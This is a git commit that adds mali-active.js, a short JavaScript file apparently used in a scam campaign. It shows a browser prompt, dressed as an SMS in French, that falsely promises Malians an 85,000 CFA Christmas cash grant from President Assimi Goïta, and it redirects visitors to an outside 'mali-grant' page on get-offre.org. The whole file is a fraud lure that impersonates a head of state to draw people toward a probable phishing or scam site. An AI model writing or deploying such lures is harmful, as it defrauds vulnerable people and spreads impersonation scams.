0312d3c0924e9e3f8a99152057aef1ad8fe7cfd7
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-11-23 19:34:39 -0800

    Create mali-active.js

---
+++ mali-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIRER 55 000CFA'
+password=prompt('SMS : Félicitations, vous êtes éligible à la subvention de Noël en espèces de 85 000CFA du Président Assimi Goïta pour les malians. Veuillez appuyer sur OK pour retirer le prix en espèces.   ','RETIRER 55 000CFA');
+if (password != 'RETIRER 55 000CFA') {
+location.href='https://get-offre.org/mali-grant.html';
+}
